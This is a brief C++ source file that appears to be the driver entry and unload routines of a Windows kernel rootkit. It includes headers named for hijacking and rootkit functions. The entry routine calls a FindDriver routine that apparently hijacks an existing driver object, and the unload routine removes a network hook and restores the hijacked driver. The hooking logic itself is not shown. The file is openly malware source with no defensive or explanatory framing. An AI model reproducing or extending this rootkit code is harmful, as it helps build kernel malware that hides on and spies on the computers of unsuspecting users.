#include "hijack.hpp"
#include "bar.hpp"
#include "rootkit.hpp"
#include "driver.hpp"

#pragma comment(lib, "ntoskrnl.lib")

extern "C" __declspec(dllexport) VOID DriverUnload(_In_ struct _DRIVER_OBJECT*)
{
    Rootkit::NetHook::UnloadHook();
    DeleteSymLink();
    RestoreDriver();
}

extern "C" 
NTSTATUS RootkitEntry(_In_ struct _DRIVER_OBJECT* DriverObject, PUNICODE_STRING)
{
    if (DriverObject != nullptr)
    {
        DriverObject->DriverUnload = DriverUnload;
    }

    if (NT_SUCCESS(FindDriver(DriverObject)))
    {
        return STATUS_SUCCESS;
    }

    return STATUS_FAILED_DRIVER_ENTRY;
}

